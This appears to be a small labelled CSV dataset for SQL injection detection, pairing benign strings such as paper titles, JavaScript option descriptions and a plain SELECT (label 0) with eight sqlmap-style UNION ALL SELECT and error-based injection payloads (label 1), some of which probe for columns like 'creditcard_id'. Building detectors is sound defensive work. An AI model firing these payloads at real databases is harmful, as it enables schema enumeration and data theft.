column,num
Human machine interface for lab abc computer applications,0
A survey of user opinion of computer system response time,0
The EPS user interface management system,0
System and human system engineering testing of EPS,0
Relation of user perceived response time to error measurement,0
The generation of random binary unordered trees,0
The intersection graph of paths in trees,0
Graph minors IV Widths of trees and well quasi ordering,0
Graph minors A survey,0
Allways is blue blue blue!!,0
maxWidth {Number} Max width. Minimum size is 320. Default undefined,0
hideCaption {Boolean} Default false,0
containerTagName {String} Default 'div',0
protocol {String} Instagram API script protocol. Default '' same as current protocol,0
"This property needed if you use device's file system, for example, Electron, Cordova apps",0
injectScript {Boolean} Default true,0
onLoading {Function},0
onSuccess {Function},0
onAfterRender {Function},0
print(len([s for s in l if s.endswith('e')])),0
select* from database where id = 1;,0
Graph minors IV Widths of trees and well quasi ordering,0
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT random FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hYEx",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aTEC FROM zsTX)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- utMa",1
"1' AND (SELECT 2551 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x38,128)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'uDRn'='uDRn",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT creditcard_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mwJp",1
"1' AND (SELECT 1606 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x32,32)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'UXrY'='UXrY",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT group_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xizA",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT category_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KddT",1
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT table_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GFKO",1
